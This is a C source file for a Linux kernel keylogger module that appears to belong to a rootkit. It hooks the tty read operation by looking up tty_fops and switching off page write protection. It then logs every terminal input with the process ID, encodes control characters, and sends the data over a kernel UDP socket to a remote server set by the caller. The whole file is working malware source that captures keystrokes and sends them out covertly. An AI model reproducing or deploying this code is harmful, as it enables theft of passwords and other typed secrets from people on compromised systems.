#include "keylogger.h"
#include "helper.h"

#include <linux/kallsyms.h>
#include <net/sock.h>
#include <linux/inet.h>

// control characters
#define NUL 0x00
#define SOH 0x01
#define STX 0x02
#define ETX 0x03
#define EOT 0x04
#define ENQ 0x05
#define ACK 0x06
#define BEL 0x07
#define BS 0x08
#define TAB 0x09
#define LF 0x0a
#define VT 0x0b
#define FF 0x0c
#define CR 0x0d
#define SO 0x0e
#define SI 0x0f
#define DLE 0x10
#define DC1 0x11
#define DC2 0x12
#define DC3 0x13
#define DC4 0x14
#define NAK 0x15
#define SYN 0x16
#define ETB 0x17
#define CAN 0x18
#define EM 0x19
#define SUB 0x1a
#define ESC 0x1b
#define FS 0x1c
#define GS 0x1d
#define RS 0x1e
#define US 0x1f
#define DEL 0x7f

#define PREFIX_LEN 7    //PID:{
#define SUFFIX_LEN 2    //}\n

typedef ssize_t (*tty_read_t) (struct file *, char __user *, size_t, loff_t *);
static tty_read_t orig_tty_read = NULL;
static struct file_operations *tty_fops = NULL;

static struct socket *sock = NULL;

int init_key_logger(void) {

    /*
     * Get pointer to tty file operations
     */

    if (NULL == (tty_fops = (struct file_operations *) kallsyms_lookup_name("tty_fops"))) {
        return -1;
    }

    /*
     * Store address of original tty->read
     */

    orig_tty_read = tty_fops->read;
    return 0;
}

/*
 * Check if character is a control character. If so, store the character identifier, otherwise
 * the character at buf + index.
 *
 * return offset
 */
static unsigned int handle_control_characters(char *buf, unsigned int index, char character) {

    switch (character) {
        // control characters
        case NUL:
            strcpy(buf + index, "[NUL]");
            return 5;
        case SOH:
            strcpy(buf + index, "[SOH]");
            return 5;
        case STX:
            strcpy(buf + index, "[STX]");
            return 5;
        case ETX:
            strcpy(buf + index, "[ETX]");
            return 5;
        case EOT:
            strcpy(buf + index, "[EOT]");
            return 5;
        case ENQ:
            strcpy(buf + index, "[ENQ]");
            return 5;
        case ACK:
            strcpy(buf + index, "[ACK]");
            return 5;
        case BEL:
            strcpy(buf + index, "[BEL]");
            return 5;
        case BS:
            strcpy(buf + index, "[BS]");
            return 4;
        case TAB:
            strcpy(buf + index, "[TAB]");
            return 5;
        case LF:
            strcpy(buf + index, "[LF]");
            return 4;
        case VT:
            strcpy(buf + index, "[VT]");
            return 4;
        case FF:
            strcpy(buf + index, "[FF]");
            return 4;
        case CR:
            strcpy(buf + index, "[CR]");
            return 4;
        case SO:
            strcpy(buf + index, "[SO]");
            return 4;
        case SI:
            strcpy(buf + index, "[SI]");
            return 4;
        case DLE:
            strcpy(buf + index, "[DLE]");
            return 5;
        case DC1:
            strcpy(buf + index, "[DC1]");
            return 5;
        case DC2:
            strcpy(buf + index, "[DC2]");
            return 5;
        case DC3:
            strcpy(buf + index, "[DC3]");
            return 5;
        case DC4:
            strcpy(buf + index, "[DC4]");
            return 5;
        case NAK:
            strcpy(buf + index, "[NAK]");
            return 5;
        case SYN:
            strcpy(buf + index, "[SYN]");
            return 5;
        case ETB:
            strcpy(buf + index, "[ETB]");
            return 5;
        case CAN:
            strcpy(buf + index, "[CAN]");
            return 5;
        case EM:
            strcpy(buf + index, "[EM]");
            return 4;
        case SUB:
            strcpy(buf + index, "[SUB]");
            return 5;
        case ESC:
            strcpy(buf + index, "[ESC]");
            return 5;
        case FS:
            strcpy(buf + index, "[FS]");
            return 4;
        case GS:
            strcpy(buf + index, "[GS]");
            return 4;
        case RS:
            strcpy(buf + index, "[RS]");
            return 4;
        case US:
            strcpy(buf + index, "[US]");
            return 4;
        case DEL:
            strcpy(buf + index, "[DEL]");
            return 5;
        default:
            buf[index] = character;
            return 1;
    }
}

/*
 * Hook function, extract information and send it to the key_logging server
 */
static ssize_t hooked_tty_read(struct file *f, char __user *buf, size_t count, loff_t *pos) {

    ssize_t ret;
    char *kernel_buf, *raw_buf;
    struct kvec vec;
    struct msghdr msg;
    unsigned int len, i, j;

    /* run the original read */
    ret = orig_tty_read(f, buf, count, pos);

    /*
     * Get data into kernel
     */
    if (NULL == (raw_buf = kmalloc(count, GFP_KERNEL))) {
        return -1;
    }

    if (copy_from_user(raw_buf, buf, count) != 0) {
        kfree(raw_buf);
        return -1;
    }

    /*
     * Count number of control characters to get required kbuf len
     *
     * if we have a control character, store reserve five bytes [XXX], where XXX is the
     * identifier from the ascii table, otherwise store reserve one byte for the actual char
     */
    len = PREFIX_LEN + SUFFIX_LEN;
    for (i = 0; i < count; i++) {
        if (raw_buf[i] < 0x20 || raw_buf[i] == 0x7f) {
            // control character
            len += 5;
        } else {
            len++;
        }
    }

    /*
     * Allocate kernel buffer memory and store prefix
     */
    if (NULL == (kernel_buf = kmalloc(len, GFP_KERNEL))) {
        kfree(raw_buf);
        return -1;
    }

    memset(kernel_buf, 0, len);

    // PREFIX
    snprintf(kernel_buf, PREFIX_LEN + 1, "%05d:{", get_current()->pid);
    j = PREFIX_LEN;

    /*
     * Store handle control characters
     */
    for (i = 0; i < count; i++) {
        j += handle_control_characters(kernel_buf, j, raw_buf[i]);
    }

    //SUFFIX
    kernel_buf[j++] = '}';
    kernel_buf[j] = '\n';

    /*
     * Send data to UDP server
     */
    memset(&vec, 0, sizeof(vec));
    memset(&msg, 0, sizeof(msg));
    vec.iov_base = kernel_buf;
    vec.iov_len = len;

    kernel_sendmsg(sock, &msg, &vec, 1, len);

    kfree(kernel_buf);
    kfree(raw_buf);
    return ret;
}

int enable_key_logger(struct sockaddr_in s_addr) {

    if (sock != NULL) {
        //already enabled
        return -1;
    }

    /*
     * Create networking stuff
     */

    if (NULL == (sock = (struct socket *) kmalloc(sizeof(struct socket), GFP_KERNEL))) {
        return -1;
    }

    if (0 > sock_create_kern(&init_net, PF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock)) {
        return -1;
    }

    if (sock->ops->connect(sock, (struct sockaddr *) &s_addr, sizeof(struct sockaddr_in), 0)) {
        kfree(sock);
        return -1;
    }

    /*
     * Hook tty->read
     */

    unprotect_paging_mode();
    tty_fops->read = hooked_tty_read;
    protect_paging_mode();

    return 0;
}

void disable_key_logger(void) {

    if (!sock) {
        // not enabled
        return;
    }

    /*
     * Re-hook tty->read
     */

    unprotect_paging_mode();
    tty_fops->read = orig_tty_read;
    protect_paging_mode();

    /*
     * Destroy networking stuff
     */

    if (sock) {
        sock_release(sock);
        sock = NULL;
    }
}